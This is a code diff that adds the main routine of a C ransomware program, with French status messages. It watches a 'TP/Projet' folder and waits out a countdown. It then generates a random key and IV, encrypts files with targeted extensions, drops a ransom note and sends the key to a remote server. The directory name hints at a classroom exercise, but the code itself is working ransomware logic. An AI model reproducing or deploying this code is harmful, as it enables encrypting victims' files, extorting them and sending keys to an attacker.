@@ -163,3 +163,49 @@ void send_key_to_server(unsigned char* key, unsigned char* iv) {
     close(sock);
 
 }
+ 
+ 
+int main() {
+    printf("[*] Surveillance du dossier TP/... \n");
+ 
+    while (1) {
+        struct stat st;
+        if (stat("TP/Projet", &st) == 0 && S_ISDIR(st.st_mode)) {
+            printf("[+] Dossier Projet détecté. Décompte lancé...\n");
+            time_t start = time(NULL);
+            while (time(NULL) - start < DEADLINE_SEC) {
+                sleep(1);
+            }
+ 
+            printf("[!] Deadline dépassée. Chiffrement en cours...\n");
+ 
+            unsigned char key[KEY_SIZE], iv[IV_SIZE];
+            RAND_bytes(key, KEY_SIZE);
+            RAND_bytes(iv, IV_SIZE);
+ 
+            DIR* d = opendir("TP/Projet");
+            struct dirent* f;
+            char filepath[512];
+            while ((f = readdir(d))) {
+                if (f->d_type == DT_REG) {
+                    for (int i = 0; i < NUM_EXT; i++) {
+                        if (ends_with(f->d_name, EXTENSIONS[i])) {
+                            snprintf(filepath, sizeof(filepath), "TP/Projet/%s", f->d_name);
+                            encrypt_file(filepath, key, iv);
+                            break;
+                        }
+                    }
+                }
+            }
+            closedir(d);
+            generate_ransom_note("TP/Projet");
+            send_key_to_server(key, iv);
+            break;
+        }
+        sleep(5);
+    }
+ 
+    return 0;
+}
+ 
+ 
